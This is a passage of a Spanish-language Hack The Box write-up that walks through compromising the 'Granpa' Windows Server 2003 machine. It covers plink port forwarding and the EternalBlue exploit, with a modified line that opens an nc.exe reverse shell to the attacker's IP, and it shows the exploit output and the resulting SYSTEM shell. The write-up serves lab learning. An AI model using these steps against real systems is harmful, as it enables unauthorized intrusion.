+<p>Cambiamos el puerto default del servicio SSH debido a que la plataforma de HackTheBox tiene unas reglas que no permite el puerto 22 para hacer <em>Remote Port Forwarding</em> y permitimos el login del usuario <strong>root</strong>.</p>
+
+<p>Una vez hecho esto, levantamos y reiniciamos el servicio SSH; así como también validamos que no tenemos el puerto 445 listado en <code class="language-plaintext highlighter-rouge">netastat</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ service ssh start
+❯ service ssh restart
+❯ netstat <span class="nt">-nat</span> | <span class="nb">grep</span> <span class="s2">"445"</span>
+</code></pre></div></div>
+
+<p>Por útlimo, cambiamos la contraseña del usuario <strong>root</strong> por una más fácil (para este caso será <em>hola</em>). Ahora si, ejecutamos el programa en la máquina víctima:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ passwd
+Nueva contraseña: 
+Vuelva a escribir la nueva contraseña: 
+passwd: contraseña actualizada correctamente
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>plink.exe <span class="nt">-l</span> root <span class="nt">-pw</span> hola <span class="nt">-R</span> 445:127.0.0.1:445 <span class="nt">-P</span> 2222 10.10.14.16
+plink.exe <span class="nt">-l</span> root <span class="nt">-pw</span> hola <span class="nt">-R</span> 445:127.0.0.1:445 <span class="nt">-P</span> 2222 10.10.14.16
+The server<span class="s1">'s host key is not cached. You have no guarantee
+that the server is the computer you think it is.
+The server'</span>s ssh-ed25519 key fingerprint is:
+ssh-ed25519 255 SHA256:NCwkGzWJ47qJZj30RdSxdkzOTenMrn4+fRsdijaL5GQ
+If you trust this host, enter <span class="s2">"y"</span> to add the key to
+PuTTY<span class="s1">'s cache and carry on connecting.
+If you want to carry on connecting just once, without
+adding the key to the cache, enter "n".
+If you do not trust this host, press Return to abandon the
+connection.
+y
+Using username "root".
+</span></code></pre></div></div>
+
+<p>Ahora validamos que tenemos el puerto 445 en escucha en nuestra máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ netstat <span class="nt">-nat</span> | <span class="nb">grep</span> <span class="s2">"445"</span>
+tcp        0      0 127.0.0.1:445           0.0.0.0:<span class="k">*</span>               LISTEN     
+tcp6       0      0 ::1:445                 :::<span class="k">*</span>                    LISTEN
+</code></pre></div></div>
+
+<p>También podríamos validar con <code class="language-plaintext highlighter-rouge">crackmapexec</code> recordando que debemos apuntar a nuestra loopback:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 127.0.0.1
+SMB         127.0.0.1       445    GRANPA           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2003 R2 3790 Service Pack 2 <span class="o">(</span>name:GRANPA<span class="o">)</span> <span class="o">(</span>domain:granpa<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Debido a la versión de sistema operativo y versión de la aplicación SMB, debemos estar pensando en el <strong>Eternal Blue</strong>; así que nos descargamos el exploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/worawit/MS17-010
+Clonando en <span class="s1">'MS17-010'</span>...
+remote: Enumerating objects: 183, <span class="k">done</span><span class="nb">.</span>
+remote: Total 183 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 183
+Recibiendo objetos: 100% <span class="o">(</span>183/183<span class="o">)</span>, 113.61 KiB | 765.00 KiB/s, listo.
+Resolviendo deltas: 100% <span class="o">(</span>102/102<span class="o">)</span>, listo.
+</code></pre></div></div>
+
+<p>Nos metemos en la carpeta y corremos el archivo <code class="language-plaintext highlighter-rouge">checker.py</code> para validar si la máquina es vulnerable:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python checker.py 127.0.0.1
+Target OS: Windows Server 2003 R2 3790 Service Pack 2
+The target is not patched
+
+<span class="o">===</span> Testing named pipes <span class="o">===</span>
+spoolss: STATUS_OBJECT_NAME_NOT_FOUND
+samr: Ok <span class="o">(</span>32 bit<span class="o">)</span>
+netlogon: Ok <span class="o">(</span>Bind context 1 rejected: provider_rejection<span class="p">;</span> abstract_syntax_not_supported <span class="o">(</span>this usually means the interface isn<span class="s1">'t listening on the given endpoint))
+lsarpc: Ok (32 bit)
+browser: STATUS_OBJECT_NAME_NOT_FOUND
+</span></code></pre></div></div>
+
+<p>Vemos que tiene la leyenda <strong><em>OK (32 bit)</em></strong> para los <em>named pipes</em> <strong>samr</strong> y <strong>lsarpc</strong>; es decir, podemos ejecutar el exploit en la máquina, que para este caso, ocuparemos el <code class="language-plaintext highlighter-rouge">zzz_exploit.py</code> modificandolo un poco. Las modificaciones que haremos serán las siguientes:</p>
+
+<ul>
+  <li>En la función <code class="language-plaintext highlighter-rouge">def smb_pwn(conn, arch):</code> comentaremos las siguientes lineas:
+    <ul>
+      <li>#print(‘creating file c:\pwned.txt on the target’)</li>
+      <li>#tid2 = smbConn.connectTree(‘C$’)</li>
+      <li>#fid2 = smbConn.createFile(tid2, ‘/pwned.txt’)</li>
+      <li>#smbConn.closeFile(tid2, fid2)</li>
+      <li>#smbConn.disconnectTree(tid2)</li>
+    </ul>
+  </li>
+  <li>Descomentamos la siguiente linea:
+    <ul>
+      <li>service_exec(conn, r’cmd /c copy c:\pwned.txt c:\pwned_exec.txt’)</li>
+    </ul>
+  </li>
+  <li>Y la cambiamos a entablarnos una reverse shell con <code class="language-plaintext highlighter-rouge">nc.exe</code>:
+    <ul>
+      <li>service_exec(conn, r’cmd /c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.16 443’)</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Con esto<strong>, lo único que nos falta es ponernos en escucha por e</strong>l puerto 443 y ejectuar el exploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python zzz_exploit.py 127.0.0.1 samr
+Target OS: Windows Server 2003 R2 3790 Service Pack 2
+Groom packets
+attempt controlling next transaction on x64
+attempt controlling next transaction on x86
+success controlling one transaction
+Target is x86
+modify parameter count to 0xffffffff to be able to write backward
+leak next transaction
+CONNECTION: 0x85119d48
+SESSION: 0xe1278088
+FLINK: 0x7bd48
+InData: 0x7ae28
+MID: 0xa
+TRANS1: 0x78b50
+TRANS2: 0x7ac90
+modify transaction struct <span class="k">for </span>arbitrary <span class="nb">read</span>/write
+make this SMB session to be SYSTEM
+current TOKEN addr: 0xe3054030
+userAndGroupCount: 0x5
+userAndGroupsAddr: 0xe30540d0
+overwriting token UserAndGroups
+Opening SVCManager on 127.0.0.1.....
+Creating service qgfA.....
+Starting service qgfA.....
+The NETBIOS connection with the remote host timed out.
+Removing service qgfA.....
+ServiceExec Error on: 127.0.0.1
+nca_s_proto_error
+Done
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.16] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.14] 1050
+Microsoft Windows <span class="o">[</span>Version 5.2.3790]
+<span class="o">(</span>C<span class="o">)</span> Copyright 1985-2003 Microsoft Corp.
+
+<span class="nb">whoami
+whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Ya con esto nos encontramos dentro de la máquina como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> y podemos visualizar las flags (user.txt y root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#patch-management" class="page__taxonomy-item" rel="tag">Patch_Management</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-09-20T00:00:00-05:00">September 20, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-aragog/" class="pagination--pager" title="Hack The Box Aragog
+">Previous</a>
+    
+    
+      <a href="/htb-granny/" class="pagination--pager" title="Hack The Box Granny
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
